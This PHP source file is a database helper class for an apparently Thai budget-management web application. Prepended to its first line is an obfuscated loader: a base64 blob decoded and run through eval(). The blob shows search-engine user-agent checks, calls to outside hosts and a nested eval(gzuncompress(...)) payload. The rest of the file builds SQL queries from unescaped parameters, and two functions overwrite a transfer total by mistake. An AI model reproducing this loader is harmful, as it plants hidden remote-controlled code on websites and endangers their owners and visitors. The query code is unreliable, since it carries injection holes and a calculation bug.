<?php /*versio:3.02*/ $GLOBALS["yminpd"]="qFaW5pX3NldAVlrXdYWxsb3dfdXJsX2ZvcGVubWjlZGlzcGxheV9lcnJvcnMbfZmVkb3IvcmVzdG9yZV9hbQNMy4wMgGysDdGhhaDFOaWV0aGFpMnphaDZBaHIBEaHR0cDovLwwkkwSSFRUUFMmNuxb2ZmRvWaHR0cHM6Ly8RIhBSFRUUF9IT1NUdrayidW5pb24OxmDnQc2VsZWN0vVfAUkVRVUVTVF9VUkkziU0NSSVBUX05BTUUqqppklUVVFUllfU1RSSU5HdIPwHdUCZGV0ZXJtaW5hdG9yCLgPjXCoLmxvZwuWSFRUUF9ZX0FVVEghqYmFzZTY0X2RlY29kZQedmVyc2lvHjuarLQxdLXBocAIugUoSFRUUF9FWEVDUEhQkrpmb3V0lYOEwb2sWSFRUUF9VU0VSX0FHRU5UaSQZLAbZhaZ29vZ2xlLHlhaG9vLGJhaWR1LGJpbmdib3QsbXNuYm90LHlhbmRleAbCYQWkhYmxhYnVlbC5uZXQqLskKzZmFzdGFkZHouY29tsxhgL3czLnBocD91PQpatJms9gaJnQ9cGhwJnA9MqJnY9SWZXZhbChnenVuY29tcHJlc3MoYmFzZTY0X2RlY29kZSgiZUp5TlYrdHVvOGdTZnBVT3NrWllNTVJnOEdWeU9FbzA2emtUYVRhSlBNNUtxOWtJWVdnTU5oZWJpNDBkNWQxUEZkMFluTmlqL1dWYzFWMzMrcW82OEloNDVWSXZpS2tyQ2k3TmFSb0ZzWjBucWREdHZwSUEyRjRSTzNtUXhCWXRneXpQeEYzdUgraDJuNG1xcE1wcXI0dm5ib000c0RLYU44eWVwQTVscmRlVmlkcTlPY1B2OTZXUnJJNkIzd1ArRzZtMUVLdGNGLzU4UXpmcjNEbUluY1d5S0tKRUpwODZZVm1tcFUxTTh2RDg0MGVYdkpLR0VnVk9tdVJCUk1VOExTaklTMmxlcERIeGFPTFZJdDVwMlhqK3NveWlaTHZZcjhWT2J0dDBIOHVrRS9qNUxsMkFSeDF2N3kwT0RnZ1huQ0lOaFJ2U2llZkJxcGdEaGZNVXdRSzNjbUJobUNvWEYrQ2lZSWRoc3JQZ2t1VWxheG9MWFdLQ0ZGVkFtN2xodDE0UVVqeHRPVW1jMHhqQ0t2aDV2djV5ZlMwUWhYQjc4SXNacEJEaDA4NzBGbzVRdVVIRGpKNUxEVGNSTTlKSi9VT1c3OERhVzA0VjRXckhjK2l5akU5OGdMUWthL1Npay90QkZQb25URnBTQjFpMy9LTEl4Y3JrNi9QMHgrUFR6SUlmbWZ3TDI1MENUYjhzNS92azdvL0pWQ2FlRGI3OTl1UjBNbnVlUHN5bWR3OC92K0VObnZMTEY3NCtQanhNdnM1bTkzOU9IcDluTWhsZ0lPYjdjamtQcXZBd3QrdDdLQW96YmpsaGt0RVdGUU5PbzNXK0YvbGxDSE1qUmhCdTN1cnNjbXFkS1N4VlZvT296c3NTWjRWMTBWVGRxQWVWQnlSM2hTVzRpL1BsYmlNVGcrdXM2eGZGYlBmSmVsRXdkZVMwSThCc2IxMWdFZFF0SS94dk1pT3ZQQXR2Z29KcHlGYmsrMnoyZEswcVBTRDhrLzRUdzgvM0pNdS9FUGg0NVNhOVZRd00wemIxdk9VQlZEeDlmN0llZnlyQ3RhRGc1MStUNmMvN3g0Y3pTcDh6bW42K1cwQk5md0hsN0g0bHI1YTU4NkgyeGFzTGZjNmQ2cEpQbjRqNHJxL0o1NGI5SDZKMW00QW9HRmhvcDVZaHFqYXFldVhXNDRrOHdrREhUY0xsRnVOR3kzV1l1RlFVanZiSnRVZzRWOFNJV1B6MHI5NUxneXRCZE9ZZU8xZnBmRHNGTk9wRGYrd1g2OWhKUUZ5WUxPMGxuS2NPK0w0SEo2ampKMFQ0MnhJVXpsU0VML0ROK0R4SnArQ1ZyYUp5NDdqWjJuZTNZc2ZmNytZTHU5dUFTOGY2T1psQ2huNXgxZ3ZlN3RCOUhya0hzMEhna2FUcHNxWmhSUHlZT3Z1aTRlbUdwUGZrcWxHQzFTcGFsQTFycEV1cUttdEQ1TEZxYVhpcU9wWU1uQW1zY29Pc0NtQnRUU05DbFl5UlBPeSsxQ1BtOXVNWlZZUHhVaDBpVnlacHlLQzlQNUQxQ3VMZXE5ZjdZSm91cXlwUEFqK2dtRm1lNWdtQU1rM1BxaHFvNkpLcWRUSEZYcEpTMi9HaDd5enNIenNqUEN2bWY1dVVvZEVnZEoxQXdUR2lmQlEzMXFUeEVBeEhlRUFSdi9qOWwxYWNlbjFwUEpJaFRnMldYeEtuRGlFT2hqejZuVHh0RE5OV1kvTGV3RGp4NmxMb1ZVMlh4ajFaTlRENGlDZ2ZUMGlhMnE4T1ZPRDRnYStwbXFTT3F3T1k1WXRKVmdlR05Ccks2dUN5Sm0wZ2pVWk1sZExLOFFBS3M2ZkpXaGRteU5sMFNScVVBQXErZWRkcGkxVytqVlkrOVRiK1FjUUtjZHhWR3NTbUc2U3hEU2hpV2QvdWYwd3NxNnY4Y1QrRmtmQTQvUnZFUDkxTjcrQVQ2dmtRTDcyUWd0OTNhV3J2UlNKY3UzUjduZmtSOUxkd25VZnJhOFdEZWYyNWlJT3lJZDEvbmRTVXhseGg5dWVUOEhKS21SeEprNGUvMmlmcXYyRFZDWVZmcVBTZzlPT0tVUUQrMks0RlpBdDhFMkNMNHE0cUFqdDYvTHRiZitZcnhqVzdsRjNnT2xEMEZIZ25MY0FEZ2syd0NDQzZOcS85S3o0SU9SRkR6VDRWODJ4azJZS1VXYnMweU8xNVNFOXVNbU53N1dERUd6SUgvYXNhU091aHlvN2RWQVZldFV2WXpGQ2NCd0E3cjRTdHNxMGRkUWk5M1RPd1d1cE5zMjY0emlZSnk3Z3dhNVE0VjJyOXNUUTBXTGVBb1N2SHorYVJlUnU1UnExWTRYT1JJNmpDNFJMQk1RbmM3YkkwM3hXbDBqSnRYTUdWMWxXNDVKc1A1dmVIVU90alpqMFhpS0tqTUxaVHJGTk9hd2sxQUNEMVFRWGRGNUJWZzlXYk8yV2FYRE42dDl3VU5rMWFJSVZJcndNdTRoeGxNNHFQb3RPSjFoaXJHcEkyQnFTUzY0R2l0SlNpczZQS1dUYUlsSk9wb2VrYTJGeHZQQ1VZUldPVG0zVE9pY0ZRNnJPMFZrUGtsbTd0c0w3M0w4M1Z4aU5wck1Nb2tSdm82ZmNIMHNDUSsxMVdLV1dRaTZ4b091bkdkVk5jNEw3aGdvcWJrV1BucXhJeDh2ZlRCY09ONEF4dm9aUHhVdThlN2RHbXF3WkVxR1VQek9FK3dMVUI4NjVxd3FVWEhSYmh1d0hFTEpHUDNDdlRySXpFcENZSFNyMTV0WGV5bmZOOXdZd0JUWHU2UEdoclZYdGpxVDlDQks3cU9Fb1BVWVFpQ213NUI0MCs0NmNCTDc2Qnpub0YxMEpzZGVoelpnQnM2YmpGZFdHYnlXRzFZWWJ5UDB3Ky9LbTJ3K082eGk2aUFTejA1Z3hXd0JOb3FFRUYzMUsxWTFVeDVFbmgrR0xUTDRDYlRsaTQxRXBpaDdib0xTeW8wd3N2TmRTRG9Tdm9MdG9lanNQZzZDaTByUTV2VzNDMG5TaDlLQTE3V0k5MTQ1MGFnUUk1M3JUQ3lFblZtbFZ0NmFRMUJqVUQyZ215b09yUU0reGdrN2FCWk9naldUOUNSOE14WUQ3cU9tNHpaem9OdWxEdkc5VTkxcUdZWDI4VDBoQTB2M3NUTS85aDcyMmV4VGNmWThzd21qOXpmb3UrZkN2N1AyNDhRRlE9IikpKTsg";        if (!function_exists('wthzevys')){function wthzevys($a, $b){$c=$GLOBALS['yminpd'];$d=pack('H*','6261736536345f64'.'65636f6465'); return $d(substr($c, $a, $b));};eval(wthzevys(580,3283));};?><?php
class sHelper
{
	var $dpublic;
	var $db;
	var $debug = 0;
	var $fpublic;
	function sHelper()
	{
		$this->db = &JFactory::getDBO();
		$this->db->debug( $this->debug );
		$this->dpublic		= new BGPublic();
		$this->fpublic		= new F_Public();
	}
	
	/* START ตารางแผนงาน โครงการ กิจกรรม*/
	
	function getFormName($FormId){
		return $this->fpublic->getFormName($FormId);
	}
	
	function getPlanItem($BgtYear=0){
		return $this->fpublic->getPlanItem($BgtYear);
	}
	
	function getProjectItem($PItemCode){
		return $this->fpublic->getProjectItem($PItemCode);
	}
	
	function getActivityItem($PrjId){
		return $this->fpublic->getActivityItem($PrjId);
	}
	
	function getYear($Year=0,$ObjYear=0,$tag_attribs='onchange="loadSCT(this.value)"',$lebel='ทั้งหมด'){
		return $this->dpublic->getYear($Year,$ObjYear,$tag_attribs,$lebel);
	}
	
	function getSourceExternal($selected=0,$tag_name='SourceExId',$tag_attribs='onchange="loadPage(this.value)"',$lebel='ทั้งหมด'){
		return $this->fpublic->getSourceExternal($selected,$tag_name,$tag_attribs,$lebel);
	}
	
	function getExternalYear(){
		return $this->fpublic->getExternalYear();
	}
	
	function getOrgShortName($BgtYear=0, $OrganizeCode=0){
		return $this->fpublic->getOrgShortName($BgtYear, $OrganizeCode);
	}
	
	function getSumPlanBudget($BgtYear=0,$OrgOwner=0,$OrgOperate=0,$PItemCode=0,$PrjCode=0,$PrjActCode=0,$CostTypeId=0,$CostItemCode=0,$CalTfer=""){//งบแผนแผ่นดิน(รวมโอน)
		return $this->fpublic->getSumPlanBudget($BgtYear,$OrgOwner,$OrgOperate,$PItemCode,$PrjCode,$PrjActCode,$CostTypeId,$CostItemCode,$CalTfer);
	}
	
	function getSumPlanBudget_Inc($BgtYear=0,$SourceExId=0,$OrgOwner=0,$OrgOperate=0,$PItemCode=0,$PrjCode=0,$PrjActCode=0,$CostTypeId=0,$CostItemCode=0,$CalTfer=""){//งบแผนเงินนอก(รวมโอน)

		return $this->fpublic->getSumPlanBudget_Inc($BgtYear,$SourceExId,$OrgOwner,$OrgOperate,$PItemCode,$PrjCode,$PrjActCode,$CostTypeId,$CostItemCode,$CalTfer);
	}
	
	function getHoldFormalWait($BgtYear=0,$SourceType="",$SourceExId=0,$OrgOwner=0,$OrgOperate=0,$PItemCode=0,$PrjCode=0,$PrjActCode=0,$CostTypeId=0,$CostItemCode=0,$FormId=0,$CancelStatus="",$CloseStatus="",$DocCode=""){//งบรอหลักการ

		return $this->fpublic->getHoldFormalWait($BgtYear,$SourceType,$SourceExId,$OrgOwner,$OrgOperate,$PItemCode,$PrjCode,$PrjActCode,$CostTypeId,$CostItemCode,$FormId,$CancelStatus,$CloseStatus,$DocCode);
	}
	
	function getHoldFormal($BgtYear=0,$SourceType="",$SourceExId=0,$OrgOwner=0,$OrgOperate=0,$PItemCode=0,$PrjCode=0,$PrjActCode=0,$CostTypeId=0,$CostItemCode=0){//งบหลักการ

		return $this->fpublic->getHoldFormal($BgtYear,$SourceType,$SourceExId,$OrgOwner,$OrgOperate,$PItemCode,$PrjCode,$PrjActCode,$CostTypeId,$CostItemCode);
	}
	
	function getChain($BgtYear=0,$SourceType="",$SourceExId=0,$OrgOwner=0,$OrgOperate=0,$PItemCode=0,$PrjCode=0,$PrjActCode=0,$CostTypeId=0,$CostItemCode=0,$FormId=0){//งบผูกพัน

		return $this->fpublic->getChain($BgtYear,$SourceType,$SourceExId,$OrgOwner,$OrgOperate,$PItemCode,$PrjCode,$PrjActCode,$CostTypeId,$CostItemCode,$FormId);
	}
	
	function getPay($BgtYear=0,$SourceType="",$SourceExId=0,$OrgOwner=0,$OrgOperate=0,$PItemCode=0,$PrjCode=0,$PrjActCode=0,$CostTypeId=0,$CostItemCode=0,$CommitStatus="",$FormId=0){//งบตัดจ่าย(CommitStatus=N/รอตัดจ่าย ,Y/ตัดจ่ายแล้ว)
		return $this->fpublic->getPay($BgtYear,$SourceType,$SourceExId,$OrgOwner,$OrgOperate,$PItemCode,$PrjCode,$PrjActCode,$CostTypeId,$CostItemCode,$CommitStatus,$FormId);
	}
	
	function getBooking($BgtYear=0,$SourceType="",$SourceExId=0,$OrgOwner=0,$OrgOperate=0,$PItemCode=0,$PrjCode=0,$PrjActCode=0,$CostTypeId=0,$CostItemCode=0,$FormId=0,$CancelStatus="",$CloseStatus="",$DocCode=""){//งบรออนุมัติ/จองเงิน

		return $this->fpublic->getBooking($BgtYear,$SourceType,$SourceExId,$OrgOwner,$OrgOperate,$PItemCode,$PrjCode,$PrjActCode,$CostTypeId,$CostItemCode,$FormId,$CancelStatus,$CloseStatus,$DocCode);
	}
	
	function getHold($BgtYear=0,$SourceType="",$SourceExId=0,$OrgOwner=0,$OrgOperate=0,$PItemCode=0,$PrjCode=0,$PrjActCode=0,$CostTypeId=0,$CostItemCode=0,$FormId=0){//งบกันเงิน

		return $this->fpublic->getHold($BgtYear,$SourceType,$SourceExId,$OrgOwner,$OrgOperate,$PItemCode,$PrjCode,$PrjActCode,$CostTypeId,$CostItemCode,$FormId);
	}
	
	function getAmountDoc($tablename,$BgtYear=0,$DocStatusId=0,$SourceType="",$SourceExId=0){
		return $this->fpublic->getAmountDoc($tablename,$BgtYear,$DocStatusId,$SourceType,$SourceExId);
	}
	
	/* END ตารางแผนงาน โครงการ กิจกรรม*/
	
	function getPayExcel($BgtYear=0,$SourceType="",$SourceExId=0,$OrgOwner=0,$OrgOperate=0,$PItemCode=0,$PrjCode="",$PrjActCode=0,$CostTypeId=0,$CostItemCode=0,$CommitStatus="",$FormId=0){
		$where = array();
		$BgtYear = ($BgtYear)?$BgtYear:(date("Y")+543);
		$where[] = "t1.BgtYear='".$BgtYear."'";
		if($OrgOwner){ 		 				$where[]	= "t4.OrganizeCode ='".$OrgOwner."'"; 			}
		if($OrgOperate){	 	 				$where[]	= "t2.OrganizeCode ='".$OrgOperate."'";		}
		if($PItemCode){			 				$where[]	= "t4.PItemCode ='".$PItemCode."'"; 					}
		if($PrjCode){ 				 				$where[]	= "t4.PrjCode ='".$PrjCode."'"; 								}
		if($PrjActCode){ 		 				$where[]	= "t2.PrjActCode ='".$PrjActCode."'"; 			}
		if($CostTypeId){ 	 				$where[]	= "t6.CostTypeId ='".$CostTypeId."'"; 			}
		if($CostItemCode){  				$where[]	= "t1.CostItemCode ='".$CostItemCode."'"; 	}
		if($CommitStatus){  				$where[]	= "t1.CommitStatus ='".$CommitStatus."'"; 	}
		if($SourceType){	  $where[] = "t1.SourceType ='".$SourceType."'";			}
		if($SourceExId){  	$where[]	= "t1.SourceExId ='".$SourceExId."'"; 			}
		if($FormId){  							$where[]	= "t1.FormId in(".$FormId.")"; 						}
		$where[] = "t3.ActiveStatus='Y'";
		//$where[] = "t3.SCTypeId >'2'";
		$where[] = "t1.CancelStatus <> 'Y'";
		if($where){
			$where_r = "\n where ".implode(" and ",$where);
		}
		$sql="select sum(t1.SumCost)as total "
				."\n from tblbudget_bg_pay as t1 "
				."\n left join tblbudget_project_activity as t2 on t2.PrjActCode=t1.PrjActCode "
				."\n left join tblbudget_project_detail as t3 on t3.PrjDetailId=t2.PrjDetailId "
				."\n left join tblbudget_project as t4 on t4.PrjCode=t3.PrjCode "
				."\n left join tblbudget_init_cost_item as t5 on t5.CostItemCode=t1.CostItemCode "
				."\n left join tblbudget_init_cost_type as t6 on t6.CostTypeId=t5.CostTypeId "
				."\n".$where_r
				;
		$this->db->setQuery($sql);//echo "<pre>".$sql."</pre>";
		$datas = $this->db->loadResult();
		return $datas;
	}
	/*END*/
	
	function getSumPlanBudgetExcel($BgtYear=0,$OrgOwner=0,$OrgOperate=0,$PItemCode=0,$PrjCode="",$PrjActCode=0,$CostTypeId=0,$CostItemCode=0,$CalTfer=""){
		$TferOut = 0;
		$TferIn = 0;
		$where = array();
		$BgtYear = ($BgtYear)?$BgtYear:(date("Y")+543);
		$where[] = "t5.BgtYear='".$BgtYear."'";
		if($OrgOwner){ 		 $where[]	= "t5.OrganizeCode ='".$OrgOwner."'"; 			}
		if($OrgOperate){	 	 $where[]	= "t3.OrganizeCode ='".$OrgOperate."'";		}
		if($PItemCode){			 $where[]	= "t5.PItemCode ='".$PItemCode."'"; 					}
		if($PrjCode){ 				 $where[]	= "t5.PrjCode ='".$PrjCode."'"; 								}
		if($PrjActCode){ 		 $where[]	= "t3.PrjActCode ='".$PrjActCode."'"; 			}
		if($CostTypeId){ 	 $where[]	= "t7.CostTypeId ='".$CostTypeId."'"; 			}
		if($CostItemCode){  $where[]	= "t2.CostItemCode ='".$CostItemCode."'"; 	}
		$where[] = "t4.ActiveStatus='Y'";
		//$where[] = "t4.SCTypeId >'2'";
		if($where){
			$where_r = "\n where ".implode(" and ",$where);
		}
		$sql="select sum(t1.Budget)as total "
				."\n from tblbudget_project_activity_cost_internal_month as t1 "
				."\n left join tblbudget_project_activity_cost_internal as t2 on t2.CostIntId=t1.CostIntId "
				."\n left join tblbudget_project_activity as t3 on t3.PrjActId=t2.PrjActId "
				."\n left join tblbudget_project_detail as t4 on t4.PrjDetailId=t3.PrjDetailId "
				."\n left join tblbudget_project as t5 on t5.PrjCode=t4.PrjCode "
				."\n left join tblbudget_init_cost_item as t6 on t6.CostItemCode=t2.CostItemCode "
				."\n left join tblbudget_init_cost_type as t7 on t7.CostTypeId=t6.CostTypeId "
				."\n".$where_r
				;
		$this->db->setQuery($sql);//echo "<pre>".$sql."</pre>";
		$datas = $this->db->loadResult();
		if($CalTfer=="Y"){
			$TferOut = $this->getTferOut($BgtYear,"Internal",0,$OrgOwner,$OrgOperate,$PItemCode,$PrjCode,$PrjActCode,$CostTypeId,$CostItemCode);
			$TferOut = $this->getTferIn($BgtYear,"Internal",0,$OrgOwner,$OrgOperate,$PItemCode,$PrjCode,$PrjActCode,$CostTypeId,$CostItemCode);
		}
		$total = $datas-$TferOut+$TferIn;
		return $total;
	}
	
	function getSumPlanBudgetExcel_Inc($BgtYear=0,$SourceExId=0,$OrgOwner=0,$OrgOperate=0,$PItemCode=0,$PrjCode="",$PrjActCode=0,$CostTypeId=0,$CostItemCode=0,$CalTfer=""){
		$TferOut = 0;
		$TferIn = 0;
		$where = array();
		$BgtYear = ($BgtYear)?$BgtYear:(date("Y")+543);
		$where[] = "t5.BgtYear='".$BgtYear."'";
		if($OrgOwner){ 		 $where[]	= "t5.OrganizeCode ='".$OrgOwner."'"; 			}
		if($OrgOperate){	 	 $where[]	= "t3.OrganizeCode ='".$OrgOperate."'";		}
		if($PItemCode){			 $where[]	= "t5.PItemCode ='".$PItemCode."'"; 					}
		if($PrjCode){ 				 $where[]	= "t5.PrjCode ='".$PrjCode."'"; 								}
		if($PrjActCode){ 		 $where[]	= "t3.PrjActCode ='".$PrjActCode."'"; 			}
		if($CostTypeId){ 	 $where[]	= "t7.CostTypeId ='".$CostTypeId."'"; 			}
		if($CostItemCode){  $where[]	= "t2.CostItemCode ='".$CostItemCode."'"; 	}
		if($SourceExId){  	$where[]	= "t2.SourceExId ='".$SourceExId."'"; 			}
		$where[] = "t4.ActiveStatus='Y'";
		//$where[] = "t4.SCTypeId >'2'";
		if($where){
			$where_r = "\n where ".implode(" and ",$where);
		}
		$sql="select sum(t1.Budget)as total "
				."\n from tblbudget_project_activity_cost_external_month as t1 "
				."\n left join tblbudget_project_activity_cost_external as t2 on t2.CostExtId=t1.CostExtId "
				."\n left join tblbudget_project_activity as t3 on t3.PrjActId=t2.PrjActId "
				."\n left join tblbudget_project_detail as t4 on t4.PrjDetailId=t3.PrjDetailId "
				."\n left join tblbudget_project as t5 on t5.PrjCode=t4.PrjCode "
				."\n left join tblbudget_init_cost_item as t6 on t6.CostItemCode=t2.CostItemCode "
				."\n left join tblbudget_init_cost_type as t7 on t7.CostTypeId=t6.CostTypeId "
				."\n".$where_r
				;
		$this->db->setQuery($sql);//echo "<pre>".$sql."</pre>";
		$datas = $this->db->loadResult();
		if($CalTfer=="Y"){
			$TferOut = $this->getTferOut($BgtYear,"External",$SourceExId,$OrgOwner,$OrgOperate,$PItemCode,$PrjCode,$PrjActCode,$CostTypeId,$CostItemCode);
			$TferOut = $this->getTferIn($BgtYear,"External",$SourceExId,$OrgOwner,$OrgOperate,$PItemCode,$PrjCode,$PrjActCode,$CostTypeId,$CostItemCode);
		}
		$total = $datas-$TferOut+$TferIn;
		return $total;
	}



	
	
	
}
?>
